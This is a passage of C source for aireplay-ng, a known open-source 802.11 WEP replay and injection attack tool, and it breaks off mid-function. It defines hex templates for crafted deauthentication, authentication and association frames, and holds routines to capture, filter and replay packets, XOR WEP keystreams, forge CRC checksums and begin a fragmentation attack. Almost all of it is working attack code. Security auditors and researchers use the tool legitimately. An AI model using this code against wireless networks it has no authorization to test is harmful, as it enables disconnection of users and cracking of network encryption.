/*
 *  802.11 WEP replay & injection attacks
 *
 *  Copyright (C) 2006-2013 Thomas d'Otreppe
 *  Copyright (C) 2004, 2005 Christophe Devine
 *
 *  WEP decryption attack (chopchop) developed by KoreK
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#if defined(linux)
    #include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <assert.h>

#include <fcntl.h>
#include <ctype.h>

#include <limits.h>

#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "version.h"
#include "pcap.h"
#include "osdep/osdep.h"
#include "crypto.h"
#include "common.h"
#include "ieee80211.h"

#define RTC_RESOLUTION  8192

#define REQUESTS    30
#define MAX_APS     20

#define NEW_IV  1
#define RETRY   2
#define ABORT   3

#define DEAUTH_REQ      \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ        \
    "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ       \
    "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define REASSOC_REQ       \
    "\x20\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00\x00\x00\x00\x00\x00\x00"

#define NULL_DATA       \
    "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS             \
    "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES           \
    "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ       \
    "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define RATE_NUM 12

#define RATE_1M 1000000
#define RATE_2M 2000000
#define RATE_5_5M 5500000
#define RATE_11M 11000000

#define RATE_6M 6000000
#define RATE_9M 9000000
#define RATE_12M 12000000
#define RATE_18M 18000000
#define RATE_24M 24000000
#define RATE_36M 36000000
#define RATE_48M 48000000
#define RATE_54M 54000000

int bitrates[RATE_NUM]={RATE_1M, RATE_2M, RATE_5_5M, RATE_6M, RATE_9M, RATE_11M, RATE_12M, RATE_18M, RATE_24M, RATE_36M, RATE_48M, RATE_54M};

extern char * getVersion(char * progname, int maj, int min, int submin, int svnrev, int beta, int rc);
extern int maccmp(unsigned char *mac1, unsigned char *mac2);
extern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);
extern int check_crc_buf( unsigned char *buf, int len );
extern const unsigned long int crc_tbl[256];
extern const unsigned char crc_chop_tbl[256][4];

char usage[] =

"\n"
"  %s - (C) 2006-2013 Thomas d\'Otreppe\n"
"  http://www.aircrack-ng.org\n"
"\n"
"  usage: aireplay-ng <options> <replay interface>\n"
"\n"
"      --help              : Displays this usage screen\n"
"\n";


struct options
{
    unsigned char f_bssid[6];
    unsigned char f_dmac[6];
    unsigned char f_smac[6];
    int f_minlen;
    int f_maxlen;
    int f_type;
    int f_subtype;
    int f_tods;
    int f_fromds;
    int f_iswep;

    int r_nbpps;
    int r_fctrl;
    unsigned char r_bssid[6];
    unsigned char r_dmac[6];
    unsigned char r_smac[6];
    unsigned char r_dip[4];
    unsigned char r_sip[4];
    char r_essid[33];
    int r_fromdsinj;
    char r_smac_set;

    char ip_out[16];    //16 for 15 chars + \x00
    char ip_in[16];
    int port_out;
    int port_in;

    char *iface_out;
    char *s_face;
    char *s_file;
    unsigned char *prga;

    int a_count;
    int a_delay;
    int f_retry;

    int ringbuffer;
    int ghost;
    int prgalen;

    int delay;
    int npackets;

    int fast;
    int bittest;

    int nodetect;
    int ignore_negative_one;
    int rtc;

    int reassoc;
}
opt;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    unsigned char mac_in[6];
    unsigned char mac_out[6];

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
    int is_madwifing;
    int is_bcm43xx;

    FILE *f_cap_in;

    struct pcap_file_header pfh_in;
}
dev;

static struct wif *_wi_in, *_wi_out;

struct ARP_req
{
    unsigned char *buf;
    int hdrlen;
    int len;
};

struct APt
{
    unsigned char set;
    unsigned char found;
    unsigned char len;
    unsigned char essid[255];
    unsigned char bssid[6];
    unsigned char chan;
    unsigned int  ping[REQUESTS];
    int  pwr[REQUESTS];
};

struct APt ap[MAX_APS];

unsigned long nb_pkt_sent;
unsigned char h80211[4096];
unsigned char tmpbuf[4096];
unsigned char srcbuf[4096];
char strbuf[512];

unsigned char ska_auth1[]     = "\xb0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xb0\x01\x01\x00\x01\x00\x00\x00";

unsigned char ska_auth3[4096] = "\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xc0\x01";


int ctrl_c, alarmed;

char * iwpriv;


void sighandler( int signum )
{
    if( signum == SIGINT )
        ctrl_c++;

    if( signum == SIGALRM )
        alarmed++;
}

int reset_ifaces()
{
    //close interfaces
    if(_wi_in != _wi_out)
    {
        if(_wi_in)
        {
            wi_close(_wi_in);
            _wi_in = NULL;
        }
        if(_wi_out)
        {
            wi_close(_wi_out);
            _wi_out = NULL;
        }
    }
    else
    {
        if(_wi_out)
        {
            wi_close(_wi_out);
            _wi_out = NULL;
            _wi_in = NULL;
        }
    }

    /* open the replay interface */
    _wi_out = wi_open(opt.iface_out);
    if (!_wi_out)
        return 1;
    dev.fd_out = wi_fd(_wi_out);

    /* open the packet source */
    if( opt.s_face != NULL )
    {
        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
        wi_get_mac(_wi_in, dev.mac_in);
    }
    else
    {
        _wi_in = _wi_out;
        dev.fd_in = dev.fd_out;

        /* XXX */
        dev.arptype_in = dev.arptype_out;
        wi_get_mac(_wi_in, dev.mac_in);
    }

    wi_get_mac(_wi_out, dev.mac_out);

    return 0;
}

int set_bitrate(struct wif *wi, int rate)
{
    int i, newrate;

    if( wi_set_rate(wi, rate) )
        return 1;

//    if( reset_ifaces() )
//        return 1;

    //Workaround for buggy drivers (rt73) that do not accept 5.5M, but 5M instead
    if (rate == 5500000 && wi_get_rate(wi) != 5500000) {
	if( wi_set_rate(wi, 5000000) )
	    return 1;
    }

    newrate = wi_get_rate(wi);
    for(i=0; i<RATE_NUM; i++)
    {
        if(bitrates[i] == rate)
            break;
    }
    if(i==RATE_NUM)
        i=-1;
    if( newrate != rate )
    {
        if(i!=-1)
        {
            if( i>0 )
            {
                if(bitrates[i-1] >= newrate)
                {
                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
                    return 1;
                }
            }
            if( i<RATE_NUM-1 )
            {
                if(bitrates[i+1] <= newrate)
                {
                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
                    return 1;
                }
            }
            return 0;
        }
        printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
        return 1;
    }
    return 0;
}

int send_packet(void *buf, size_t count)
{
	struct wif *wi = _wi_out; /* XXX globals suck */
	unsigned char *pkt = (unsigned char*) buf;

	if( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
	{
		pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
		pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
	}

	if (wi_write(wi, buf, count, NULL) == -1) {
		switch (errno) {
		case EAGAIN:
		case ENOBUFS:
			usleep(10000);
			return 0; /* XXX not sure I like this... -sorbo */
		}

		perror("wi_write()");
		return -1;
	}

	nb_pkt_sent++;
	return 0;
}

int read_packet(void *buf, size_t count, struct rx_info *ri)
{
	struct wif *wi = _wi_in; /* XXX */
	int rc;

        rc = wi_read(wi, buf, count, ri);
        if (rc == -1) {
            switch (errno) {
            case EAGAIN:
                    return 0;
            }

            perror("wi_read()");
            return -1;
        }

	return rc;
}

void read_sleep( int usec )
{
    struct timeval tv, tv2, tv3;
    int caplen;
    fd_set rfds;

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);

    tv3.tv_sec=0;
    tv3.tv_usec=10000;

    while( ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) < (usec) )
    {
        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )
        {
            continue;
        }

        if( FD_ISSET( dev.fd_in, &rfds ) )
            caplen = read_packet( h80211, sizeof( h80211 ), NULL );

        gettimeofday(&tv2, NULL);
    }
}


int filter_packet( unsigned char *h80211, int caplen )
{
    int z, mi_b, mi_s, mi_d, ext=0, qos;

    if(caplen <= 0)
        return( 1 );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 )
    {
        qos = 1; /* 802.11e QoS */
        z+=2;
    }

    if( (h80211[0] & 0x0C) == 0x08)    //if data packet
        ext = z-24; //how many bytes longer than default ieee80211 header

    /* check length */
    if( caplen-ext < opt.f_minlen ||
        caplen-ext > opt.f_maxlen ) return( 1 );

    /* check the frame control bytes */

    if( ( h80211[0] & 0x0C ) != ( opt.f_type    << 2 ) &&
        opt.f_type    >= 0 ) return( 1 );

    if( ( h80211[0] & 0x70 ) != (( opt.f_subtype << 4 ) & 0x70) && //ignore the leading bit (QoS)
        opt.f_subtype >= 0 ) return( 1 );

    if( ( h80211[1] & 0x01 ) != ( opt.f_tods         ) &&
        opt.f_tods    >= 0 ) return( 1 );

    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds  << 1 ) &&
        opt.f_fromds  >= 0 ) return( 1 );

    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep   << 6 ) &&
        opt.f_iswep   >= 0 ) return( 1 );

    /* check the extended IV (TKIP) flag */

    if( opt.f_type == 2 && opt.f_iswep == 1 &&
        ( h80211[z + 3] & 0x20 ) != 0 ) return( 1 );

    /* MAC address checking */

    switch( h80211[1] & 3 )
    {
        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
        default: mi_b = 10; mi_d = 16; mi_s = 24; break;
    }

    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_b, opt.f_bssid, 6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_s,  opt.f_smac,  6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_d,  opt.f_dmac,  6 ) != 0 )
            return( 1 );

    /* this one looks good */

    return( 0 );
}

int wait_for_beacon(unsigned char *bssid, unsigned char *capa, char *essid)
{
    int len = 0, chan = 0, taglen = 0, tagtype = 0, pos = 0;
    unsigned char pkt_sniff[4096];
    struct timeval tv,tv2;
    char essid2[33];

    gettimeofday(&tv, NULL);
    while (1)
    {
        len = 0;
        while (len < 22)
        {
            len = read_packet(pkt_sniff, sizeof(pkt_sniff), NULL);

            gettimeofday(&tv2, NULL);
            if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 10000*1000) //wait 10sec for beacon frame
            {
                return -1;
            }
            if(len <= 0) usleep(1);
        }
        if (! memcmp(pkt_sniff, "\x80", 1))
        {
            pos = 0;
            taglen = 22;    //initial value to get the fixed tags parsing started
            taglen+= 12;    //skip fixed tags in frames
            do
            {
                pos    += taglen + 2;
                tagtype = pkt_sniff[pos];
                taglen  = pkt_sniff[pos+1];
            } while(tagtype != 3 && pos < len-2);

            if(tagtype != 3) continue;
            if(taglen != 1) continue;
            if(pos+2+taglen > len) continue;

            chan = pkt_sniff[pos+2];

            if(essid)
            {
                pos = 0;
                taglen = 22;    //initial value to get the fixed tags parsing started
                taglen+= 12;    //skip fixed tags in frames
                do
                {
                    pos    += taglen + 2;
                    tagtype = pkt_sniff[pos];
                    taglen  = pkt_sniff[pos+1];
                } while(tagtype != 0 && pos < len-2);

                if(tagtype != 0) continue;
                if(taglen <= 1)
                {
                    if (memcmp(bssid, pkt_sniff+10, 6) == 0) break;
                    else continue;
                }
                if(pos+2+taglen > len) continue;

                if(taglen > 32)taglen = 32;

                if((pkt_sniff+pos+2)[0] < 32 && memcmp(bssid, pkt_sniff+10, 6) == 0)
                {
                    break;
                }

                /* if bssid is given, copy essid */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) == 0)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    break;
                }

                /* if essid is given, copy bssid AND essid, so we can handle case insensitive arguments */
                if(bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0 && strncasecmp(essid, (char*)pkt_sniff+pos+2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    memcpy(bssid, pkt_sniff+10, 6);
                    printf("Found BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\" to given ESSID \"%s\".\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);
                    break;
                }

                /* if essid and bssid are given, check both */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) > 0)
                {
                    memset(essid2, 0, 33);
                    memcpy(essid2, pkt_sniff+pos+2, taglen);
                    if(strncasecmp(essid, essid2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                        break;
                    else
                    {
                        printf("For the given BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\", there is an ESSID mismatch!\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                        printf("Found ESSID \"%s\" vs. specified ESSID \"%s\"\n", essid2, essid);
                        printf("Using the given one, double check it to be sure its correct!\n");
                        break;
                    }
                }
            }
        }
    }

    if(capa) memcpy(capa, pkt_sniff+34, 2);

    return chan;
}

/**
    if bssid != NULL its looking for a beacon frame
*/
int attack_check(unsigned char* bssid, char* essid, unsigned char* capa, struct wif *wi)
{
    int ap_chan=0, iface_chan=0;

    iface_chan = wi_get_channel(wi);

    if(iface_chan == -1 && !opt.ignore_negative_one)
    {
        PCT; printf("Couldn't determine current channel for %s, you should either force the operation with --ignore-negative-one or apply a kernel patch\n",
                wi_get_ifname(wi));
        return -1;
    }

    if(bssid != NULL)
    {
        ap_chan = wait_for_beacon(bssid, capa, essid);
        if(ap_chan < 0)
        {
            PCT; printf("No such BSSID available.\n");
            return -1;
        }
        if((ap_chan != iface_chan) && (iface_chan != -1 || !opt.ignore_negative_one))
        {
            PCT; printf("%s is on channel %d, but the AP uses channel %d\n", wi_get_ifname(wi), iface_chan, ap_chan);
            return -1;
        }
    }

    return 0;
}

int getnet( unsigned char* capa, int filter, int force)
{
    unsigned char *bssid;

    if(opt.nodetect)
        return 0;

    if(filter)
        bssid = opt.f_bssid;
    else
        bssid = opt.r_bssid;


    if( memcmp(bssid, NULL_MAC, 6) )
    {
        PCT; printf("Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d\n",
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(_wi_in));
    }
    else if(strlen(opt.r_essid) > 0)
    {
        PCT; printf("Waiting for beacon frame (ESSID: %s) on channel %d\n", opt.r_essid,wi_get_channel(_wi_in));
    }
    else if(force)
    {
        PCT;
        if(filter)
        {
            printf("Please specify at least a BSSID (-b) or an ESSID (-e)\n");
        }
        else
        {
            printf("Please specify at least a BSSID (-a) or an ESSID (-e)\n");
        }
        return( 1 );
    }
    else
        return 0;

    if( attack_check(bssid, opt.r_essid, capa, _wi_in) != 0)
    {
        if(memcmp(bssid, NULL_MAC, 6))
        {
            if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
            {
                printf( "Please specify an ESSID (-e).\n" );
            }
        }

        if(!memcmp(bssid, NULL_MAC, 6))
        {
            if(strlen(opt.r_essid) > 0)
            {
                printf( "Please specify a BSSID (-a).\n" );
            }
        }
        return( 1 );
    }

    return 0;
}

int xor_keystream(unsigned char *ph80211, unsigned char *keystream, int len)
{
    int i=0;

    for (i=0; i<len; i++) {
        ph80211[i] = ph80211[i] ^ keystream[i];
    }

    return 0;
}

int capture_ask_packet( int *caplen, int just_grab )
{
    time_t tr;
    struct timeval tv;
    struct tm *lt;

    fd_set rfds;
    long nb_pkt_read;
    int i, j, n, mi_b=0, mi_s=0, mi_d=0, mi_t=0, mi_r=0, is_wds=0, key_index_offset;
    int ret, z;

    FILE *f_cap_out;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;

    if( opt.f_minlen  < 0 ) opt.f_minlen  =   40;
    if( opt.f_maxlen  < 0 ) opt.f_maxlen  = 1500;
    if( opt.f_type    < 0 ) opt.f_type    =    2;
    if( opt.f_subtype < 0 ) opt.f_subtype =    0;
    if( opt.f_iswep   < 0 ) opt.f_iswep   =    1;

    tr = time( NULL );

    nb_pkt_read = 0;

    signal( SIGINT, SIG_DFL );

    while( 1 )
    {
        if( time( NULL ) - tr > 0 )
        {
            tr = time( NULL );
            printf( "\rRead %ld packets...\r", nb_pkt_read );
            fflush( stdout );
        }

        if( opt.s_file == NULL )
        {
            FD_ZERO( &rfds );
            FD_SET( dev.fd_in, &rfds );

            tv.tv_sec  = 1;
            tv.tv_usec = 0;

            if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
            {
                if( errno == EINTR ) continue;
                perror( "select failed" );
                return( 1 );
            }

            if( ! FD_ISSET( dev.fd_in, &rfds ) )
                continue;

            gettimeofday( &tv, NULL );

            *caplen = read_packet( h80211, sizeof( h80211 ), NULL );

            if( *caplen  < 0 ) return( 1 );
            if( *caplen == 0 ) continue;
        }
        else
        {
            /* there are no hidden backdoors in this source code */

            n = sizeof( pkh );

            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
                SWAP32( pkh.caplen );
                SWAP32( pkh.len );
            }

            tv.tv_sec  = pkh.tv_sec;
            tv.tv_usec = pkh.tv_usec;

            n = *caplen = pkh.caplen;

            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )
            {
                printf( "\r\33[KInvalid packet length %d.\n", n );
                return( 1 );
            }

            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
            {
                /* remove the prism header */

                if( h80211[7] == 0x40 )
                    n = 64;
                else
                    n = *(int *)( h80211 + 4 );

                if( n < 8 || n >= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
            {
                /* remove the radiotap header */

                n = *(unsigned short *)( h80211 + 2 );

                if( n <= 0 || n >= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
            {
                /* remove the PPI header */

                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));

                if( n <= 0 || n>= (int) *caplen )
                    continue;

                /* for a while Kismet logged broken PPI headers */
                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
                    n = 32;

                if( n <= 0 || n>= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }
        }

        nb_pkt_read++;

        if( filter_packet( h80211, *caplen ) != 0 )
            continue;

        if(opt.fast)
            break;

        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
            z+=2;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; is_wds = 0; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; is_wds = 0; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; is_wds = 0; break;
            case  3: mi_t = 10; mi_r =  4; mi_d = 16; mi_s = 24; is_wds = 1; break;  // WDS packet
        }

        printf( "\n\n        Size: %d, FromDS: %d, ToDS: %d",
                *caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

        if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
        {
//             if (is_wds) key_index_offset = 33; // WDS packets have an additional MAC, so the key index is at byte 33
//             else key_index_offset = 27;
            key_index_offset = z+3;

            if( ( h80211[key_index_offset] & 0x20 ) == 0 )
                printf( " (WEP)" );
            else
                printf( " (WPA)" );
        }

        printf( "\n\n" );

        if (is_wds) {
            printf( "        Transmitter  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_t    ], h80211[mi_t + 1],
                    h80211[mi_t + 2], h80211[mi_t + 3],
                    h80211[mi_t + 4], h80211[mi_t + 5] );

            printf( "           Receiver  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_r    ], h80211[mi_r + 1],
                    h80211[mi_r + 2], h80211[mi_r + 3],
                    h80211[mi_r + 4], h80211[mi_r + 5] );
        } else {
            printf( "              BSSID  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_b    ], h80211[mi_b + 1],
                    h80211[mi_b + 2], h80211[mi_b + 3],
                    h80211[mi_b + 4], h80211[mi_b + 5] );
        }

        printf( "          Dest. MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_d    ], h80211[mi_d + 1],
                h80211[mi_d + 2], h80211[mi_d + 3],
                h80211[mi_d + 4], h80211[mi_d + 5] );

        printf( "         Source MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_s    ], h80211[mi_s + 1],
                h80211[mi_s + 2], h80211[mi_s + 3],
                h80211[mi_s + 4], h80211[mi_s + 5] );

        /* print a hex dump of the packet */

        for( i = 0; i < *caplen; i++ )
        {
            if( ( i & 15 ) == 0 )
            {
                if( i == 224 )
                {
                    printf( "\n        --- CUT ---" );
                    break;
                }

                printf( "\n        0x%04x:  ", i );
            }

            printf( "%02x", h80211[i] );

            if( ( i & 1 ) != 0 )
                printf( " " );

            if( i == *caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
            {
                for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
                {
                    printf( "  " );
                    if( ( j & 1 ) != 0 )
                        printf( " " );
                }

                printf( " " );

                for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 126 )
                                  ? '.' : h80211[i - 15 + j] );
            }

            if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
            {
                printf( " " );

                for( j = 0; j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 127 )
                                  ? '.' : h80211[i - 15 + j] );
            }
        }

        printf( "\n\nUse this packet ? " );
        fflush( stdout );
        ret=0;
        while(!ret) ret = scanf( "%s", tmpbuf );
        printf( "\n" );

        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
            break;
    }

    if(!just_grab)
    {
        pfh_out.magic         = TCPDUMP_MAGIC;
        pfh_out.version_major = PCAP_VERSION_MAJOR;
        pfh_out.version_minor = PCAP_VERSION_MINOR;
        pfh_out.thiszone      = 0;
        pfh_out.sigfigs       = 0;
        pfh_out.snaplen       = 65535;
        pfh_out.linktype      = LINKTYPE_IEEE802_11;

        lt = localtime( (const time_t *) &tv.tv_sec );

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                "replay_src-%02d%02d-%02d%02d%02d.cap",
                lt->tm_mon + 1, lt->tm_mday,
                lt->tm_hour, lt->tm_min, lt->tm_sec );

        printf( "Saving chosen packet in %s\n", strbuf );

        if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
        {
            perror( "fopen failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed\n" );
            return( 1 );
        }

        pkh.tv_sec  = tv.tv_sec;
        pkh.tv_usec = tv.tv_usec;
        pkh.caplen  = *caplen;
        pkh.len     = *caplen;

        n = sizeof( pkh );

        if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed" );
            return( 1 );
        }

        n = pkh.caplen;

        if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed" );
            return( 1 );
        }

        fclose( f_cap_out );
    }

    return( 0 );
}

int read_prga(unsigned char **dest, char *file)
{
    FILE *f;
    int size;

    if(file == NULL) return( 1 );
    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);

    f = fopen(file, "r");

    if(f == NULL)
    {
         printf("Error opening %s\n", file);
         return( 1 );
    }

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    rewind(f);

    if(size > 1500) size = 1500;

    if( fread( (*dest), size, 1, f ) != 1 )
    {
    	fclose(f);
        fprintf( stderr, "fread failed\n" );
        return( 1 );
    }

    opt.prgalen = size;

    fclose(f);
    return( 0 );
}

void add_icv(unsigned char *input, int len, int offset)
{
    unsigned long crc = 0xFFFFFFFF;
    int n=0;

    for( n = offset; n < len; n++ )
        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    input[len]   = (crc      ) & 0xFF;
    input[len+1] = (crc >>  8) & 0xFF;
    input[len+2] = (crc >> 16) & 0xFF;
    input[len+3] = (crc >> 24) & 0xFF;

    return;
}

void send_fragments(unsigned char *packet, int packet_len, unsigned char *iv, unsigned char *keystream, int fragsize, int ska)
{
    int t, u;
    int data_size;
    unsigned char frag[32+fragsize];
    int pack_size;
    int header_size=24;

    data_size = packet_len-header_size;
    packet[23] = (rand() % 0xFF);

    for (t=0; t+=fragsize;)
    {

    //Copy header
        memcpy(frag, packet, header_size);

    //Copy IV + KeyIndex
        memcpy(frag+header_size, iv, 4);

    //Copy data
        if(fragsize <= packet_len-(header_size+t-fragsize))
            memcpy(frag+header_size+4, packet+header_size+t-fragsize, fragsize);
        else
            memcpy(frag+header_size+4, packet+header_size+t-fragsize, packet_len-(header_size+t-fragsize));

    //Make ToDS frame
        if(!ska)
        {
            frag[1] |= 1;
            frag[1] &= 253;
        }

    //Set fragment bit
        if (t< data_size) frag[1] |= 4;
        if (t>=data_size) frag[1] &= 251;

    //Fragment number
        frag[22] = 0;
        for (u=t; u-=fragsize;)
        {
            frag[22] += 1;
        }
//        frag[23] = 0;

    //Calculate packet length
